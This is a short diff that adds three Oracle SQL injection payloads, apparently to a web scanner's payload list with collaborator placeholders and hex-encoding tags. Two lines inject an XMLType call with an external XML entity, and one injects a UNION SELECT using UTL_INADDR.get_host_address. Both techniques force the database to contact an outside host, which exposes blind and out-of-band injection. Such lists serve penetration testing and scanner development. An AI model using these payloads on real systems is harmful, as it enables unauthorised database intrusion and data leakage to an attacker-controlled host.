@@ -1,0 +1,3 @@
+||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % hksug SYSTEM "!-VARIABLE_COLLABORATOR-!'||'fy.com/">%hksug;]>'),'/l') from dual)||
+<@hex_entities>||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % hksug SYSTEM "!-VARIABLE_COLLABORATOR-!'||'fy.com/">%hksug;]>'),'/l') from dual)||<@/hex_entities>
+<@hex_entities>1 UNION SELECT UTL_INADDR.get_host_address('!-VARIABLE_COLLABORATOR-!') <@/hex_entities>
